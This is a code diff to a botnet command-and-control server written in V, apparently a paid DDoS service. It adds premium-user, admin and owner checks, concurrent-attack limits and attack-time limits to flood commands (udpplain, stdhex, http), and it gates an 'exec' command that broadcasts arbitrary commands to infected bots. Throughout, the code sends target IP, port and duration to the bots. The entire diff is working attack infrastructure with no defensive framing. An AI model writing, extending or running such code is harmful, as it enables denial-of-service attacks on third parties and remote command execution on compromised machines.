@@ -5,6 +5,7 @@ import net
 import time
 import crypto.sha1
 
+import core.auth
 import core.crud
 import core.logger
 import core.attack
@@ -129,7 +130,6 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn, usern string) {
 		data := (reader.read_line() or { "" }).replace("\r", "").replace("\n", "")
 		fcmd, cmd, args := s.bot.parse_buffer(data)
 		if data.len > 2 {
-			user_info := s.user_crud.find(usern)
 			match cmd {
 				/* 	All attack commands must move to 
 					/core/attack/main.v
@@ -150,49 +150,84 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn, usern string) {
 					}
 				}
 				"udpplain" {
-					if args.len < 4 {
-						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: udp <ip> <port> <time>\r\n") or { 0 }
+					if auth.is_premium(usern) == true {
+						if args.len < 4 {
+							client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: udp <ip> <port> <time>\r\n") or { 0 }
+						} else {
+							if auth.validate_conn(usern) {
+								if auth.validate_time(usern, args[3]) {
+									go auth.run_attack_time(usern, args[3])
+									bots := s.bot.broadcast_cmd("udpplain ${args[1]} ${args[2]} ${args[3]}")
+									client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
+								} else {
+									client.write_string("[ x ] Error, You've went over your maxtime!") or { 0 }
+								}
+							} else {
+								client.write_string("[ x ] Error, You've reached the maximum concurrents!") or { 0 }
+							}
+						}
 					} else {
-						bots := s.bot.broadcast_cmd("udpplain ${args[1]} ${args[2]} ${args[3]}")
-						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
-						mut a := attack.prepare(args, user_info, mut s.bot.socket, attack.AttackType.bots)
-						a.send()
-					}
-				}
-				"tcp" {
-					if args.len < 4 {
-						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: tcp <ip> <port> <time>\r\n") or { 0 }
-					} else {
-						bots := s.bot.broadcast_cmd("tcp ${args[1]} ${args[2]} ${args[3]}")
-						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
+						client.write_string("[ x ] Error, You are not a premium user to use this command!") or { 0 }
 					}
 				}
 				"stdhex" {
-					if args.len < 4 {
-						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: stdhex <ip> <port> <time>\r\n") or { 0 }
+					if auth.is_premium(usern) == true {
+						if args.len < 4 {
+							client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: stdhex <ip> <port> <time>\r\n") or { 0 }
+						} else {
+							if auth.validate_conn(usern) {
+								if auth.validate_time(usern, args[3]) {
+									bots := s.bot.broadcast_cmd("stdhex ${args[1]} ${args[2]} ${args[3]}")
+									client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
+								} else {
+									client.write_string("[ x ] Error, You've went over your maxtime!") or { 0 }
+								}
+							} else {
+								client.write_string("[ x ] Error, You've reached the maximum concurrents!") or { 0 }
+							}
+						}
 					} else {
-						bots := s.bot.broadcast_cmd("stdhex ${args[1]} ${args[2]} ${args[3]}")
-						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
+						client.write_string("[ x ] Error, You are not a premium user to use this command!") or { 0 }
 					}
 				}
 				"http" {
-					if args.len < 3 {
-						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: http <ip> <time>\r\n") or { 0 }
+					if auth.is_premium(usern) == true {
+						if args.len < 4 {
+							client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: stdhex <ip> <port> <time>\r\n") or { 0 }
+						} else {
+							if auth.validate_conn(usern) {
+								if auth.validate_time(usern, args[3]) {
+									bots := s.bot.broadcast_cmd("http ${args[1]} ${args[2]}")
+									client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
+								} else {
+									client.write_string("[ x ] Error, You've went over your maxtime!") or { 0 }
+								}
+							} else {
+								client.write_string("[ x ] Error, You've reached the maximum concurrents!") or { 0 }
+							}
+						}
 					} else {
-						bots := s.bot.broadcast_cmd("http ${args[1]} ${args[2]}")
-						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
+						client.write_string("[ x ] Error, You are not a premium user to use this command!") or { 0 }
 					}
 				}
 				"exec" {
-					bots := s.bot.broadcast_cmd("${data}")
-					client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
+					if auth.is_owner(usern) {
+						bots := s.bot.broadcast_cmd("${data}")
+						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
+					} else {
+						client.write_string("[ x ] Error, You are not the owner to use this!") or { 0 }
+					}
 				}
 				"title" {
-					if args.len < 2 {
-						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: title <title_msg>\r\n")  or { 0 }
+					if auth.is_admin(usern) || auth.is_owner(usern) {
+						if args.len < 2 {
+							client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: title <title_msg>\r\n")  or { 0 }
+						} else {
+							s.c_title = "${fcmd}".replace("${args[0]} ", "")
+						}	
 					} else {
-						s.c_title = "${fcmd}".replace("${args[0]} ", "")
-					}	
+						client.write_string("[ x ] Error, You are not an admin to use this!") or { 0 }
+					}
 				} else { 
 					client.write_string("[ x ] Error, No command found....!\r\n") or { 0 }
 				}
